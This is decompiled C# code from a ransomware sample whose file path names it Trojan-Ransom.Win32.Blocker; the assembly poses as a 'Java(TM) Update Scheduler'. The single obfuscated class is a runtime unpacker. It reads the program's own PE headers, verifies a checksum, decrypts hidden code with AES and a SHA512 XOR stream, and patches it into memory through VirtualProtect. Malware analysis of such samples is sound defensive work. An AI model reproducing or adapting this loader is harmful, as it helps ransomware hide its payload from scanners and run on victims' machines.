// Decompiled with JetBrains decompiler
// Type: 夭谹숿茍㠱븉
// Assembly: Java(TM) Update Scheduler, Version=7.8.23.8, Culture=neutral, PublicKeyToken=null
// MVID: 54422980-21B4-4F02-866B-2C0284A5709C
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00100-msil\Trojan-Ransom.Win32.Blocker.pay-cb14610d9737dfe6f8672c39419bfd112bcb8aefbdfd7b8ffad486b64e852a23.exe

using System;
using System.IO;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security.Cryptography;

internal static class 夭\uED37谹숿\uF3D5茍㠱븉
{
  [DllImport("kernel32.dll", EntryPoint = "VirtualProtect")]
  private static extern bool 庮ꁣ눚\uFFFDᠳㄻﰮዏ(
    IntPtr _param0,
    uint _param1,
    uint _param2,
    out uint _param3);

  public static unsafe void ꨧ䢈䧀\uE33D胷\uFFFD愠撲()
  {
    Module module = typeof (夭\uED37谹숿\uF3D5茍㠱븉).Module;
    IntPtr hinstance = Marshal.GetHINSTANCE(module);
    if (hinstance == (IntPtr) -1)
      Environment.FailFast("Module error");
    bool flag = module.FullyQualifiedName[0] != '<';
    Stream input = (Stream) new UnmanagedMemoryStream((byte*) hinstance.ToPointer(), 268435455L, (long) (317250955 - 143273258 + (2146637773 - 2052180015)), FileAccess.ReadWrite);
    byte[] array;
    ulong num1;
    byte[] numArray1;
    byte[] numArray2;
    using (BinaryReader binaryReader = new BinaryReader(input))
    {
      input.Seek((long) (561713446 - 561713386), SeekOrigin.Begin);
      uint offset1 = binaryReader.ReadUInt32();
      input.Seek((long) offset1, SeekOrigin.Begin);
      input.Seek(6L, SeekOrigin.Current);
      uint num2 = (uint) binaryReader.ReadUInt16();
      input.Seek(12L, SeekOrigin.Current);
      uint num3 = (uint) binaryReader.ReadUInt16();
      uint num4;
      input.Seek((long) (num4 = offset1 + 24U), SeekOrigin.Begin);
      int num5 = (int) binaryReader.ReadUInt16();
      input.Seek(62L, SeekOrigin.Current);
      long position = input.Position;
      uint offset2 = binaryReader.ReadUInt32() ^ 559281413U;
      if ((int) offset2 == 801259802 - 241978389)
        Environment.FailFast("Broken file");
      uint num6;
      input.Seek((long) (num6 = num4 + num3), SeekOrigin.Begin);
      uint offset3 = 0;
      for (int index1 = 0; (long) index1 < (long) num2; ++index1)
      {
        int num7 = 0;
        for (int index2 = 0; index2 < 8; ++index2)
        {
          byte num8 = binaryReader.ReadByte();
          if (num8 != (byte) 0)
            num7 += (int) num8;
        }
        uint num9 = binaryReader.ReadUInt32();
        uint num10 = binaryReader.ReadUInt32();
        int num11 = (int) binaryReader.ReadUInt32();
        uint num12 = binaryReader.ReadUInt32();
        if (num7 == 756)
          offset3 = flag ? num10 : num12;
        if (!flag && offset2 > num10 && offset2 < num10 + num9)
          offset2 = offset2 - num10 + num12;
        input.Seek(16L, SeekOrigin.Current);
      }
      input.Seek((long) offset2, SeekOrigin.Begin);
      using (MemoryStream memoryStream = new MemoryStream())
      {
        input.Position += 12L;
        input.Position += (long) (binaryReader.ReadUInt32() + 4U);
        input.Position += 2L;
        ushort num13 = binaryReader.ReadUInt16();
        for (int index = 0; index < (int) num13; ++index)
        {
          uint num14 = binaryReader.ReadUInt32() + offset2;
          uint count = binaryReader.ReadUInt32();
          int num15 = 0;
          while (binaryReader.ReadByte() != (byte) 0)
            ++num15;
          long num16 = input.Position += (long) ((num15 + 1 + 3 & -4) - (num15 + 1));
          input.Position = (long) num14;
          memoryStream.Write(binaryReader.ReadBytes((int) count), 0, (int) count);
          input.Position = num16;
        }
        array = memoryStream.ToArray();
      }
      input.Seek((long) offset3, SeekOrigin.Begin);
      num1 = binaryReader.ReadUInt64() ^ (ulong) (1005895615238024926L ^ 1179575856L);
      binaryReader.ReadInt32();
      binaryReader.ReadInt32();
      numArray1 = binaryReader.ReadBytes(binaryReader.ReadInt32() ^ -663773850);
      numArray2 = binaryReader.ReadBytes(binaryReader.ReadInt32() ^ -1646397993 - 1666528927);
    }
    byte[] hash = MD5.Create().ComputeHash(array);
    if ((long) (BitConverter.ToUInt64(hash, 0) ^ BitConverter.ToUInt64(hash, 8)) != (long) num1)
      Environment.FailFast("Broken file");
    byte[] src = 夭\uED37谹숿\uF3D5茍㠱븉.ⱊ᳚퉦晀ᕻ芷砗钀(array, numArray1, numArray2);
    Buffer.BlockCopy((Array) new byte[array.Length], 0, (Array) array, 0, array.Length);
    if (src[0] != (byte) 214 || (int) src[1] != 1555351541 - 1555351430)
      Environment.FailFast("Broken file");
    byte[] numArray3 = new byte[src.Length - 2];
    Buffer.BlockCopy((Array) src, 2, (Array) numArray3, 0, numArray3.Length);
    using (BinaryReader binaryReader = new BinaryReader((Stream) new MemoryStream(numArray3)))
    {
      uint length = binaryReader.ReadUInt32();
      int[] numArray4 = new int[(IntPtr) length];
      IntPtr[] numArray5 = new IntPtr[(IntPtr) length];
      for (int index = 0; (long) index < (long) length; ++index)
      {
        uint num17 = binaryReader.ReadUInt32() ^ (uint) (1598961347 ^ 168380749);
        if (num17 != 0U)
        {
          uint num18 = binaryReader.ReadUInt32() ^ 4014345045U;
          byte[] source = binaryReader.ReadBytes(binaryReader.ReadInt32());
          IntPtr destination = (IntPtr) (long) (uint) ((int) hinstance + (flag ? (int) num18 : (int) num17));
          uint num19;
          夭\uED37谹숿\uF3D5茍㠱븉.庮ꁣ눚\uFFFDᠳㄻﰮዏ(destination, (uint) source.Length, 4U, out num19);
          Marshal.Copy(source, 0, destination, source.Length);
          夭\uED37谹숿\uF3D5茍㠱븉.庮ꁣ눚\uFFFDᠳㄻﰮዏ(destination, (uint) source.Length, num19, out num19);
          numArray4[index] = source.Length;
          numArray5[index] = destination;
        }
      }
    }
  }

  private static byte[] ⱊ᳚퉦晀ᕻ芷砗钀(byte[] _param0, byte[] _param1, byte[] _param2)
  {
    RijndaelManaged rijndaelManaged = new RijndaelManaged();
    byte[] buffer = new byte[_param2.Length];
    using (CryptoStream cryptoStream = new CryptoStream((Stream) new MemoryStream(_param2), rijndaelManaged.CreateDecryptor(SHA256.Create().ComputeHash(_param0), _param1), CryptoStreamMode.Read))
      cryptoStream.Read(buffer, 0, _param2.Length);
    SHA512 shA512 = SHA512.Create();
    byte[] hash = shA512.ComputeHash(_param0);
    for (int offset = 0; offset < buffer.Length; offset += (1609056604 ^ 176627665 ^ -1652567597 - 1332376040) - (1134471357 - (1812785210 - 1139294371)))
    {
      int num = buffer.Length <= offset + (660186437 - 660186373) ? buffer.Length : offset + 64;
      for (int index = offset; index < num; ++index)
        buffer[index] ^= (byte) ((uint) hash[index - offset] ^ (uint) (1139342788 - 295517666 ^ 1984382308 - 1140557317));
      hash = shA512.ComputeHash(buffer, offset, num - offset);
    }
    return buffer;
  }
}
